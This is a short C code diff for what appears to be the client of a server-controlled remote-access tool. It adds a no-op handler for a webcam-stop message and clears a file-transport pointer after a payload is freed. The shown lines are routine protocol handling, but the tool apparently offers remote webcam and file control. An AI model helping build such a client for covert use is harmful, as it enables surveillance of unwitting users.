@@ -1164,6 +1421,9 @@ void remote_client_run(void) {
                         /* Server may send Complete after upload; close our upload slot if any. */
                         upload_close();
                     }
+                    else if (subtype == REMOTE_SUBTYPE_DoWebcamStop) {
+                        /* No-op; server may send when closing file manager / switching view. */
+                    }
                     else {
                         remote_log("[loop] unknown subtype %u; no handler (ignored)", subtype);
                     }
@@ -1171,6 +1431,7 @@ void remote_client_run(void) {
                     remote_log("[loop] payload still not IMessage after prepend? first byte=0x%02X, len=%u", dispatch_len > 0 ? dispatch_buf[0] : 0, dispatch_len);
                 }
             }
+            g_file_transport = NULL;
             HeapFree(GetProcessHeap(), 0, payload_buf);
         }
         upload_close();
